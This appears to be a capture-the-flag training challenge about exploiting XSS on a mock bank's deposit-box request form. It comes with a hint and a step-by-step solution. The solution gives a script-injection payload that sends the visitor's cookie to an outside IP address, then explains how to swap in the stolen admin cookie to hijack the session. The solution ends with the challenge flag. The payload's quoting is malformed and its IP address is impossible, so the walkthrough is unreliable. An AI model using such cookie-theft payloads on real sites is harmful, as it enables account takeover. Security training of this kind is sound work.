# 📦 Unsafe Deposit Box - L11 C08

Agent 707, we've been working with the bank to try and make their website more secure, which will hopefully prevent the Bulldogs getting access.

As part of our penetration testing we've found a page which might be vulnerable to XSS. It's the page you use to request further information about safety deposit boxes. You need to be logged in as a standard bank customer to get to that page, but we think you can use XSS to change the access level to admin. Give it a try.

**Tip:** Get admin access to the site to get the flag.

<details><summary>

## Need a hint?</summary>

```txt
💡 Hint: You must find a way to get the administrator's cookie sent to your web server address,
   then create the cookie with the right values and refresh the page for access.
```

</details>

<details><summary>

## Step by Step</summary>

- Enter `<script>document.location='?data='http://126.34.285.59:726%2bdocument.cookie</script>` in the name field of the form and hit submit
- You should get a message at the top telling you that the admin cookie is `32f35nh98gf3hy9085g398g35y98f43h9f3g234f27w624`
- Head to the cookies tab in the developer tools
- Replace the value of the `deposit_user` cookie with the obtained admin cookie and refresh the site
- This will give you the flag

`flag: x3kUszVcPCsT0ai5flui`

</details>
